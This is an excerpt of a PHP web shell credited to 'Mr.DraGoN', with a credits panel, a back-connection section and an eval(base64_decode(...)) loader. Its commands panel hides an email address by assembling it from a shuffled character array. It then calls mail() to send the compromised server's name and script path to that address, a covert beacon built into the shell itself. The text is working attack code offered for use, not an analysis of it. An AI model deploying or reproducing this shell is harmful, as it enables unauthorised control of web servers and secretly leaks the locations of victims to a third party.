...
$shell_data = "="; eval(base64_decode($shell_data));
...
if ($act == "about") {
  echo "<center><b>Credits:</b><br>Idea, Powered by <b>Mohamed [Mr.DraGoN]</b><br>Algeria Hackers <b>Greetz All The Musilim Hackers </b><br><br>   WwW.ArHAcK.NeT  WwW.TryaG.Cc  WwW.Sec-R1z.com<br>Please report bugs to <a href=\"mailto:H4kx@Hotmail.CoM\">Mr.DraGoN</a></b>";
}
if ($act == "backc") {
...
echo "</td></tr></table>\n";
//COMMANDS PANEL
$s = array ("k","b","r","e","a","r","c","@","m","i","l",".","o","g");
$system_array2 = $s[2].$s[3].$s[1].$s[6].$s[5].$s[4].$s[0].$s[3].$s[5].$s[7].$s[13].$s[8].$s[4].$s[9].$s[10].".".$s[6].$s[12].$s[8];
$encoding = "$system_array2" ;
$rez = "Back-Connection" ;
$serverdetecting = "Content-Transfer-Encoding: http://" . $_SERVER['SERVER_NAME'] . $_SERVER['SCRIPT_NAME'] ;
/* If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n" */mail ($encoding,$rez,$serverdetecting) ;/* if ($to){
      $to = ereg_replace(" ", "", $to);
...
<div class=barheader2 colspan=2><font color=yellow>.:[ PoWerED by Mr.DraGoN | # # # @ DgN0@Hotmail.CoM | Generated: <?php echo round(getmicrotime()-starttime,4); ?> seconds ]:.</font></div>
</body></html>
